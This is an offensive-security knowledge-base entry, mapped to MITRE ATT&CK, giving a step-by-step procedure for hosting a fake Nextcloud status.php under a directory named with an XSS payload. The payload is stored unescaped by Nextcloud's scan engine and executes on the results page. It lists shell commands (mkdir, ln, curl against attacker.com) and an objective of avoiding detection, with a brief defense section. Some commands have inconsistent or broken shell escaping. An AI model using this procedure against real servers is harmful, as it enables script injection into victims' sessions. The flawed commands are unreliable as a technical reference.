---
tags:
  - xss
  - setup
  - web-server
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/mkdir-heh-script-alert-1]]'
  - '[[commands/ln-status-php-symlink]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:41.795Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: 98db82a5-002b-416d-b412-61eaed5259ea
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Host-Malicious-status-php-with-XSS-in-Directory-Path

## Summary

This procedure sets up a malicious web server hosting a Nextcloud-compatible status.php file in a directory path that includes an XSS payload, allowing the URL to carry executable JavaScript when scanned and stored by the target.

## Description

In the context of exploiting the stored XSS in Nextcloud's scan engine, the attacker hosts a status.php that returns JSON scan data (e.g., version and flavors). The key is embedding the payload like <script>alert(1)</script> in the directory name, so the full URL path injects HTML/JS. This is stored unescaped in the scan results and executed via innerHTML on the results page. Prerequisites include a running web server and basic shell access.

## Requirements

1. Web server (e.g., Apache/Nginx) on attacker-controlled host
2. PHP support for status.php
3. Shell access to create directories and symlinks
4. Internet-accessible domain/IP

## Defense

Defensive measures and detection strategies:

- Sanitize all URL paths in logging/scanning systems
- Use textContent instead of innerHTML for displaying URLs
- Implement strict CSP to block inline scripts
- Monitor for unusual directory names in scan queues

## Objectives

1. Create a URL that embeds XSS without altering the status.php content
2. Ensure the endpoint returns valid JSON to pass scanning
3. Prepare for queuing without immediate detection

## Instructions

### Step 1: Create Malicious Directory

**Context**: This embeds the XSS payload in the URL path by naming the directory with the script tag.

**Command** ([[commands/mkdir-heh-script-alert-1]]):
```bash
mkdir 'heh<script>alert(1)'
```

> This creates a directory named 'heh<script>alert(1)', ensuring the path includes the payload. Expected output: Directory created without errors.

### Step 2: Symlink status.php

**Context**: Place status.php in the malicious path via symlink to avoid direct file naming issues, using shell escaping for the < character.

**Command** ([[commands/ln-status-php-symlink]]):
```bash
ln -s ../status.php heh\\<script>alert(1)/
```

> This symlinks status.php into the subdirectory, resulting in a URL like http://attacker.com/heh<script>alert(1)/status.php. Expected output: Symlink created successfully.

### Step 3: Verify Hosting

**Context**: Ensure the URL is accessible and returns JSON.

**Command** (curl):
```bash
curl http://attacker.com/heh<script>alert(1)/status.php
```

> Confirms the endpoint works; no JS executes yet as it's path-based.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/mkdir-heh-script-alert-1]]
- [[commands/ln-status-php-symlink]]

## Tools Used


## Tags

- xss
- setup
- web-server
